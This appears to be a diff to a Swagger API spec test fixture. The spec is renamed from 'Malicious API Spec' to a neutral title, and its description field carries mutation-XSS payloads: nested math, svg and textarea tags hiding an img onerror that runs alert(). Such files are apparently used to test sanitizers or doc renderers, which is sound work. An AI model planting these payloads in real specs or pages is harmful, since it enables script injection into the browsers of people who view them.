@@ -1,13 +1,5 @@
-# malicious.yaml
 swagger: '2.0'
 info:
-  title: Malicious API Spec
+  title: Classic API Resource Documentation
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(3733424583)'>">
-  version: 1.0.0
-paths:
-  /test:
-    get:
-      responses:
-        '200':
-          description: Success
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
